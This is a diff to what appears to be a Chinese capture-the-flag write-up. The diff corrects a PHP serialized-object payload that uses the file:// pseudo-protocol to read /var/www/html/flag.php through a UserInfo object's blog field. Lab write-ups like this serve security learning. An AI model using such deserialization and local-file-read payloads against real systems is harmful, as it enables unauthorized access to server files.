@@ -79,13 +79,13 @@ class UserInfo
 发现可以采用file://伪协议进行文件读取，并且已知flag.php和view.php均位于/var/www/html/目录下，故构造payload：
 
 ```
-$a = new UserInfo('1',2,'file://var/www/html/flag.php');
+$a = new UserInfo('1',2,'file:///var/www/html/flag.php');
 ```
 
 获取反序列化字符串，得到
 
 ```
-O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:2;s:4:"blog";s:28:"file://var/www/html/flag.php";}
+O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:2;s:4:"blog";s:29:"file:///var/www/html/flag.php";}
 ```
 
 将反序列化字符串放入url中构造payload：
